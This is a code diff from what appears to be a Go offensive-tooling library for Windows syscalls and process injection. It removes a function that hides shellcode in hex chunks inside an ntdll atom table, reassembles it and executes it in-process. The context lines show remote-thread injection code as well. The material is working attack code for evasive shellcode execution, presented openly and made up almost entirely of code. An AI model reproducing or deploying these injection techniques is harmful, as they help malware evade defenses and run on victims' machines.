@@ -10,8 +10,6 @@ import (
 	"github.com/carved4/go-native-syscall/pkg/debug"
 	"github.com/carved4/go-native-syscall/pkg/obf"
 	"github.com/carved4/go-native-syscall/pkg/syscall"
-	"encoding/hex"
-	"strings"
 	"unicode/utf16"
 )
 
@@ -1291,95 +1289,6 @@ func NtInjectRemoteIndirect(processHandle uintptr, payload []byte) error {
 	}
 	
 	debug.Printfln("WINAPI_INDIRECT", "Remote thread created and running - not waiting for completion\n")
-
-	return nil
-}
-
-func NtInjectAtomShellcodeIndirect(shellcode []byte) error {
-	// 1. Initialize atom package
-	_, err := CallNtdllFunction("RtlInitializeAtomPackage")
-	if err != nil {
-		return fmt.Errorf("failed to initialize atom package: %v", err)
-	}
-
-	// 2. Create an atom table
-	var atomTable uintptr
-	_, err = CallNtdllFunction("RtlCreateAtomTable",
-		uintptr(37), // Number of buckets
-		uintptr(unsafe.Pointer(&atomTable)))
-	if err != nil {
-		return fmt.Errorf("failed to create atom table: %v", err)
-	}
-	defer CallNtdllFunction("RtlDestroyAtomTable", atomTable)
-
-	// 3. Prepare and store shellcode in chunks
-	shellcodeHex := hex.EncodeToString(shellcode)
-	const chunkSize = 120
-	var atoms []uint16
-
-	for i := 0; i*chunkSize < len(shellcodeHex); i++ {
-		start := i * chunkSize
-		end := start + chunkSize
-		if end > len(shellcodeHex) {
-			end = len(shellcodeHex)
-		}
-		chunk := shellcodeHex[start:end]
-		prefixedChunk := fmt.Sprintf("sc_%d:%s", i, chunk)
-
-		wideStr, err := utf16PtrFromString(prefixedChunk)
-		if err != nil {
-			return fmt.Errorf("failed to create wide string for chunk %d: %v", i, err)
-		}
-
-		var atom uint16
-		_, err = CallNtdllFunction("RtlAddAtomToAtomTable",
-			atomTable,
-			uintptr(unsafe.Pointer(wideStr)),
-			uintptr(unsafe.Pointer(&atom)))
-		if err != nil {
-			return fmt.Errorf("failed to add chunk %d to atom table: %v", i, err)
-		}
-		atoms = append(atoms, atom)
-	}
-
-	// 4. Retrieve shellcode from atoms
-	retrievedHexParts := make([]string, len(atoms))
-	for i, atom := range atoms {
-		resultBuffer := make([]uint16, 512)
-		var atomNameLength uint32 = uint32(len(resultBuffer))
-		_, err := CallNtdllFunction("RtlQueryAtomInAtomTable",
-			atomTable,
-			uintptr(atom),
-			uintptr(0), uintptr(0),
-			uintptr(unsafe.Pointer(&resultBuffer[0])),
-			uintptr(unsafe.Pointer(&atomNameLength)))
-		if err != nil {
-			return fmt.Errorf("failed to query atom 0x%04x: %v", atom, err)
-		}
-
-		retrievedString := utf16ToString(&resultBuffer[0], len(resultBuffer))
-		expectedPrefix := fmt.Sprintf("sc_%d:", i)
-		if !strings.HasPrefix(retrievedString, expectedPrefix) {
-			return fmt.Errorf("retrieved string for chunk %d has wrong prefix", i)
-		}
-		retrievedHexParts[i] = strings.TrimPrefix(retrievedString, expectedPrefix)
-	}
-
-	// 5. Reconstruct and execute shellcode
-	fullHex := strings.Join(retrievedHexParts, "")
-	if fullHex != shellcodeHex {
-		return fmt.Errorf("reconstructed shellcode does not match original")
-	}
-
-	reconstructedShellcode, err := hex.DecodeString(fullHex)
-	if err != nil {
-		return fmt.Errorf("failed to decode reconstructed hex: %v", err)
-	}
-
-	err = NtInjectSelfShellcodeIndirect(reconstructedShellcode)
-	if err != nil {
-		return fmt.Errorf("shellcode execution failed: %v", err)
-	}
 
 	return nil
 }
